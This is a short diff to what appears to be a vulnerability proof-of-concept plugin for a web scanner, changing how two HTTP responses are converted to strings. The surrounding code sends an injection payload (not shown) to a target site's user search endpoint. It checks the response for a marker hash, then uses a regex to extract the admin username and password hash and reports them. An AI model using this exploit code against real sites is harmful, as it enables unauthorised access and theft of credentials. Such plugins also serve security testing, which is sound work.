@@ -55,7 +55,7 @@ class Poc(ABPoc):
             attack_url = self.target + '/user/?q=help&type=search&page=1&kw='
             request = urllib.request.Request(attack_url, payload_v)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             res = '5d975967029ada386ba2980a04b7720e'
             if res in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -76,7 +76,7 @@ class Poc(ABPoc):
             match_data = re.compile('did=---(.*)---([\\w\\d]{32,32})---')
             attack_url = self.target + '/user/?q=help&type=search&page=1&kw='
             request = urllib.request.Request(attack_url, payload)
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
             data = match_data.findall(response)
             if data:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息：username={username},password={password}'.format(
